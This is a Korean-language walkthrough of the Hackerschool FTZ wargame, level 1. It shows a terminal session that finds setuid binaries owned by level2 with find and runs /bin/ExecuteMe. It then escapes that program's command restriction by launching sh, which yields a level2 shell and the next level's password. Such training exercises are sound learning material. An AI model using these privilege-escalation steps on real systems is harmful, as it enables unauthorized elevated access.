# Hackerschool FTZ Level 01
```
login as: level1
level1@192.168.18.131's password:
[level1@ftz level1]$ pwd
/home/level1
[level1@ftz level1]$ ls -al
total 88
drwxr-xr-x    4 root     level1       4096 Jan 16  2009 .
drwxr-xr-x   34 root     root         4096 Sep 10  2011 ..
-rw-------    1 root     root            1 Jan 15  2010 .bash_history
-rw-r--r--    1 root     root           24 Feb 24  2002 .bash_logout
-rw-rw-r--    1 root     root          224 Feb 24  2002 .bash_profile
-rw-r--r-x    1 root     root          151 Feb 24  2002 .bashrc
-rw-r--r--    1 root     root          400 Feb 24  2002 .cshrc
-rw-r--r--    1 root     root         4742 Feb 24  2002 .emacs
-rw-r--r--    1 root     root          162 Feb 24  2002 .epems
-r--r--r--    1 root     root          319 Feb 24  2002 .gtkrc
-rw-r--r--    1 root     root          100 Feb 24  2002 .gvimrc
-rw-r--r--    1 root     root           47 Apr  4  2000 hint
-rw-r--r--    1 root     root          226 Feb 24  2002 .muttrc
-rw-r--r--    1 root     root          367 Feb 24  2002 .profile
drwxr-xr-x    2 root     level1       4096 Dec  7  2003 public_html
drwxrwxr-x    2 root     level1       4096 Jan 16  2009 tmp
-rw-r--r--    1 root     root            1 May  7  2002 .viminfo
-rw-r--r--    1 root     root         4145 Feb 24  2002 .vimrc
-rw-------    1 root     root          106 Mar  6  2000 .Xauthority
-rw-r--r--    1 root     root          245 Feb 24  2002 .Xdefaults
[level1@ftz level1]$ cat hint


level2 권한에 setuid가 걸린 파일을 찾는다.


[level1@ftz level1]$ find / -perm -4000 -user level2 2>/dev/null
/bin/ExecuteMe
[level1@ftz level1]$ /bin/ExecuteMe



                레벨2의 권한으로 당신이 원하는 명령어를
                한가지 실행시켜 드리겠습니다.
                (단, my-pass 와 chmod는 제외)

                어떤 명령을 실행시키겠습니까?


                [level2@ftz level2]$ sh


sh-2.05b$ my-pass

Level2 Password is "hacker or cracker".

sh-2.05b$
```
처음 접속하면 `/home/level1` 경로에 로그인된다.

`find` 명령을 통해
- `/` 경로에서 
- `-perm -4000` 옵션을 통해 Set UID 권한을 가지고 있고
- `-user level2` 옵션을 통해 level2 의 유저가 가지고 있는 파일을
- `2>/dev/null` 으로 오류를 출력하지 않으면서

찾습니다.

그러면 `/bin/ExecuteMe` 파일이 나오는데, 실행시키면 간이 쉘이 뜨는데, FTZ 에서 비밀번호를 볼 수 있는 `my-pass` 명령어와 파일의 권한을 변경하는 `chmod` 명령어를 입력할 수 없다고 한다.  
그렇다면 `sh` 를 입력하여 실제 쉘을 띄운 뒤, `my-pass` 를 입력하면 Level2 의 비밀번호를 얻을 수 있다.